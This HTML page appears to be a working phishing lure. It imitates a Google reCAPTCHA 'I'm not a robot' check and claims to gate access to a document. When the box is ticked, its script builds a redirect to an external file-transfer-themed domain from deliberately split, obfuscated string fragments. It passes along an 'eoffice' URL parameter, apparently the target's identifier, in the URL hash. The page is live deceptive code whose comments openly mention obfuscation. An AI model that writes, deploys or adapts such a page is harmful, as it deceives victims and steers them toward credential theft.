<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Verifying</title>
  <style>
    :root{
      --bg: #f5f7fa;
      --card: #f8f9fa;
      --accent: #4285f4;
      --text: #202124;
      --success: #34a853;
      --link: #1a73e8;
    }
    html,body{
      height:100%;
      margin:0;
      font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
      background: var(--bg);
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
    }

    .wrap{
      min-height:100%;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:24px;
    }

    /* Breathing image container */
    .breath {
      display:flex;
      align-items:center;
      justify-content:center;
      width:360px;
      height:360px;
      transition:opacity .3s ease, transform .3s ease;
    }

    .breath img{
      width:50%;
      height:50%;
      object-fit:contain;
      /* breathing animation (scale up & down) */
      animation: breathe 2s ease-in-out 1;
      will-change: transform;
    }

    @keyframes breathe{
      0%   { transform: scale(1); }
      50%  { transform: scale(1.08); }
      100% { transform: scale(1); }
    }

    /* Captcha card (hidden initially) */
    .captcha-card{
      display:none;
      width:360px;
      padding:24px;
      border-radius:10px;
      background: transparent;
    }

    .title{
      font-size:17px;
      margin-bottom:20px;
      color:var(--text);
      text-align:center;
      line-height:1.4;
      font-weight:500;
    }

    .checkbox-row{
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
      background: rgba(0,0,0,0.03);
      padding:16px 20px;
      border-radius:8px;
      margin-bottom:12px;
      position:relative;
    }

    .checkbox-container {
      display:flex;
      align-items:center;
      gap:12px;
    }

    .checkbox-row input[type="checkbox"]{
      width:20px;
      height:20px;
      accent-color: var(--accent);
      transition: accent-color 0.3s ease;
    }

    .checkbox-row.verified input[type="checkbox"]{
      accent-color: var(--success);
    }

    .recaptcha-container {
      display: flex;
      flex-direction: column;
      align-items: flex-end;
      gap: 4px;
    }

    .recaptcha-icon {
      width:28px;
      height:28px;
    }

    .recaptcha-links {
      font-size: 11px;
      color: var(--link);
      display: flex;
      gap: 8px;
    }

    .recaptcha-links a {
      color: inherit;
      text-decoration: none;
    }

    .recaptcha-links a:hover {
      text-decoration: underline;
    }

    @media (max-width:460px){
      .breath, .captcha-card { width:92%; height:auto; }
      .breath { padding:22px; height:300px; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <!-- Breathing image (visible first) -->
    <div id="breath" class="breath" aria-hidden="false">
      <img src="logo.png" alt="Loading" />
    </div>

    <!-- Captcha card (hidden initially) -->
    <div id="captcha" class="captcha-card" role="dialog" aria-modal="true" aria-labelledby="capTitle">
      <div class="title" id="capTitle">To view this document,<br>verify you're not a robot below</div>

      <div id="checkboxRow" class="checkbox-row">
        <div class="checkbox-container">
          <input id="notRobot" type="checkbox" aria-label="I'm not a robot checkbox" />
          <div style="font-weight:700">I'm not a robot</div>
        </div>
        <div class="recaptcha-container">
          <svg class="recaptcha-icon" viewBox="0 0 122.88 116.79">
            <path fill="#1C3AA9" d="M101.42,40.78c0-0.59-0.02-1.17-0.04-1.75V5.88l-9.16,9.17C84.72,5.86,73.31,0,60.53,0 c-13.3,0-25.12,6.35-32.59,16.18l15.02,15.18c1.47-2.72,3.56-5.06,6.08-6.83c2.62-2.05,6.34-3.72,11.48-3.72 c0.62,0,1.1,0.07,1.45,0.21c6.37,0.5,11.89,4.02,15.14,9.12L66.48,40.77C79.95,40.72,95.17,40.69,101.42,40.78L101.42,40.78 L101.42,40.78z M101.42,40.78L101.42,40.78L101.42,40.78L101.42,40.78z"/>
            <path fill="#4285F4" d="M60.29,0c-0.59,0-1.17,0.02-1.75,0.04H25.38l9.17,9.16C25.37,16.71,19.5,28.12,19.5,40.9 c0,13.3,6.35,25.12,16.18,32.59l15.18-15.02c-2.72-1.47-5.06-3.56-6.83-6.08c-2.05-2.62-3.72-6.34-3.72-11.48 c0-0.62,0.07-1.1,0.21-1.45c0.5-6.37,4.02-11.89,9.12-15.14l10.63,10.63C60.23,21.47,60.19,6.26,60.29,0L60.29,0L60.29,0z M60.29,0 L60.29,0L60.29,0L60.29,0z"/>
            <path fill="#ABABAB" d="M19.51,40.9c0,0.59,0.02,1.17,0.04,1.75V75.8l9.16-9.16c7.5,9.18,18.91,15.04,31.69,15.04 c13.3,0,25.12-6.35,32.59-16.18L77.97,50.32c-1.47,2.72-3.56,5.06-6.08,6.83c-2.62,2.05-6.34,3.72-11.48,3.72 c-0.62,0-1.1-0.07-1.45-0.21c-6.37-0.5-11.89-4.02-15.14-9.12l10.63-10.63C40.98,40.96,25.76,40.99,19.51,40.9L19.51,40.9 L19.51,40.9z M19.51,40.9L19.51,40.9L19.51,40.9L19.51,40.9z"/>
          </svg>
          <div class="recaptcha-links">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Elements
    const breathEl = document.getElementById('breath');
    const captchaEl = document.getElementById('captcha');
    const checkbox = document.getElementById('notRobot');
    const checkboxRow = document.getElementById('checkboxRow');

    // Obfuscated URL components
    const baseUrlParts = [
      'https:',
      '//proton',
      'files.',
      'egvhfz',
      'transfer',
      'cygv.',
      'online/',
      'tOnDqXfQ'
    ];

    // Function to get URL parameter securely
    function getUrlParam(name) {
      try {
        const url = new URL(window.location.href);
        return url.searchParams.get(name) || '';
      } catch {
        return '';
      }
    }

    // Function to construct redirect URL
    function getRedirectUrl() {
      const eofficeValue = getUrlParam('eoffice');
      const baseUrl = baseUrlParts.join('').replace(/\s+/g, '');
      
      if (!eofficeValue) return baseUrl;
      
      // Encode the value for URL hash
      const encodedValue = encodeURIComponent(eofficeValue)
        .replace(/'/g, '%27')
        .replace(/\(/g, '%28')
        .replace(/\)/g, '%29');
      
      return `${baseUrl}#${encodedValue}`;
    }

    // Show captcha after breathing animation ends (2s)
    function showCaptcha() {
      breathEl.style.opacity = '0';
      breathEl.style.transform = 'scale(.98)';
      setTimeout(() => {
        breathEl.style.display = 'none';
        captchaEl.style.display = 'block';
        checkbox.focus();
      }, 250);
    }

    // Start timer for showing captcha
    setTimeout(showCaptcha, 2000);

    // Verification handler
    checkbox.addEventListener('change', () => {
      if (checkbox.checked) {
        setTimeout(() => {
          checkboxRow.classList.add('verified');
          
          setTimeout(() => {
            const redirectUrl = getRedirectUrl();
            
            // Additional obfuscation layer
            const finalUrl = redirectUrl.split('').reverse().join('');
            window.location.href = finalUrl.split('').reverse().join('');
          }, 500);
        }, 1500);
      } else {
        checkboxRow.classList.remove('verified');
      }
    });

    // Accessibility support
    checkbox.addEventListener('keyup', (e) => {
      if (e.key === 'Enter') {
        checkbox.checked = !checkbox.checked;
        checkbox.dispatchEvent(new Event('change'));
      }
    });
  </script>
</body>
</html>
